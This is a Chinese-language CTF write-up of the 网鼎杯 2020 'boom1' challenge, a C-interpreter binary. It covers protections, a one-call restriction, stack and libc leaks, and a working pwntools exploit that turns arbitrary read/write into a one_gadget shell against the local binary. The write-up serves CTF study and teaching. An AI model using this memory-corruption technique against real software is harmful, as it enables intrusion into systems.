# 【复现】网鼎杯 2020 青龙组 boom1

这道题目看起来是一个c语言的解释器，跟这个-[write-a-C-interpreter](https://github.com/lotabout/write-a-C-interpreter)很像，就没详细逆向。

### 0x1 分析

```shell
[*] './wdb2020/boom1/pwn 2'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

保护全开。

这道题目我主要看了一眼`main`函数。主要有这么几个注意的地方。

1. 这里给出了可以用的东西：

   ```c
   "char else enum if int return sizeof while open read write close puts malloc free printf memset memcmp exit void main";
   ```

2. 一是函数只能用一次，准确来说应该是调用函数的指令只能用一次：

   ```c
   if ( v68 != 30 )
     break;
   v39 = flag--;
   if ( v39 != 1 )
   {
     puts("NOTALLOW");
     exit(0);
   }
   v60 = open((const char *)stacka[1], *stacka, v50, v51);
   ```

3. 二是这个`flag`的位置在`data`段

4. 然后是经过测试我们可以泄漏出真实的栈地址。

   ```c
   payload= '''
   int main(int argc,char ** argv){
       int a;
       printf("%llx,%llx\n",&a,argv);
   }
   '''
   
   // output:
   // 0x7feecfd79fd8,0x7ffeeb0de420
   
   pwndbg>vmmap
   pwndbg> vmmap
   LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
       0x558a9bbb7000     0x558a9bbbd000 r-xp     6000 0      /root/wdb2020/boom1/pwn
       0x558a9bdbc000     0x558a9bdbd000 r--p     1000 5000   /root/wdb2020/boom1/pwn
       0x558a9bdbd000     0x558a9bdbe000 rw-p     1000 6000   /root/wdb2020/boom1/pwn
       0x7feecf863000     0x7feecfa23000 r-xp   1c0000 0      /lib/x86_64-linux-gnu/libc-2.23.so
       0x7feecfa23000     0x7feecfc23000 ---p   200000 1c0000 /lib/x86_64-linux-gnu/libc-2.23.so
       0x7feecfc23000     0x7feecfc27000 r--p     4000 1c0000 /lib/x86_64-linux-gnu/libc-2.23.so
       0x7feecfc27000     0x7feecfc29000 rw-p     2000 1c4000 /lib/x86_64-linux-gnu/libc-2.23.so
       0x7feecfc29000     0x7feecfc2d000 rw-p     4000 0
       0x7feecfc2d000     0x7feecfc53000 r-xp    26000 0      /lib/x86_64-linux-gnu/ld-2.23.so
       0x7feecfcf9000     0x7feecfe41000 rw-p   148000 0
       0x7feecfe52000     0x7feecfe53000 r--p     1000 25000  /lib/x86_64-linux-gnu/ld-2.23.so
       0x7feecfe53000     0x7feecfe54000 rw-p     1000 26000  /lib/x86_64-linux-gnu/ld-2.23.so
       0x7feecfe54000     0x7feecfe55000 rw-p     1000 0
       0x7ffeeb0bf000     0x7ffeeb0e0000 rw-p    21000 0      [stack]
       0x7ffeeb0f1000     0x7ffeeb0f3000 r--p     2000 0      [vvar]
       0x7ffeeb0f3000     0x7ffeeb0f5000 r-xp     2000 0      [vdso]
   0xffffffffff600000 0xffffffffff601000 r-xp     1000 0      [vsyscall]
   ```

#### 漏洞利用

大致过程就是：泄漏栈地址和ELF地址 -> 修改`flag` -> 写入`one_gadget`拿到shell。

这个程序经测试可以任意地址读写，所以如果我们修改栈比如`main`的`ret`为`one_gadget`，我们就可以拿到`shell`。那么我们首先需要泄漏`libc`。我们可以通过测试中的变量`argv`来得到真实的`stack`，然后计算出`libc_main_ret`的偏移来泄漏`libc`，再然后修改这里为`one_gadget`，就可以拿到`shell`，但是函数只能使用一次，那么就得想办法修改`flag`，来我让我们多次调用函数，索性在保存的`rbp`的位置可以拿到`elf`的地址，然后通过指针偏移（`flag`到原`rbp`的偏移）修改`flag`为`1`，就可以再次调用函数了。

- 这是调试的时候需要用到的栈上的两个位置。

```shell
rbp  0x7ffe9b85e910 —▸ 0x55fa6190ae30 ◂— push   r15
     0x7ffe9b85e918 —▸ 0x7f418decc830 (__libc_start_main+240) ◂— mov    edi, eax
     

pwndbg> vmmap
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
    0x55fa61906000     0x55fa6190c000 r-xp     6000 0      /root/wdb2020/boom1/pwn
[···]
    0x7ffe9b83f000     0x7ffe9b860000 rw-p    21000 0      [stack]
```

- 这是当时找的的`rbp`和`flag`的偏移：

  ![](./offset.png)

### 0x2 EXP

```python
#! /usr/bin/python
#-*- coding: utf-8 -*-
from pwn import *

context.terminal = ['tmux', 'splitw', '-h']
context(arch = 'amd64' , os = 'linux', log_level='debug')

p=process('./pwn')
# gdb.attach(p, 'b *$rebase(0x4DE6)\n')
# pause()

payload='''
int main(){
    int *a, *b;
    a = &b;
    a = *(a + 4);
    b = a - 30;
    a = *b;
    b = b + 1;
    a = a + 262716;
    printf("%p\n", *b);
    *a = 1;
    read(0, b, 0x100);
}
'''
print (payload)
p.recvuntil('living...\n')

p.send(payload)
libc_base = int(p.recvline(keepends=False),16) - 240 - 0x020740
success(hex(libc_base))

one = p64(libc_base+0xf1147)
# pause()
p.send(one)

p.interactive()#
```



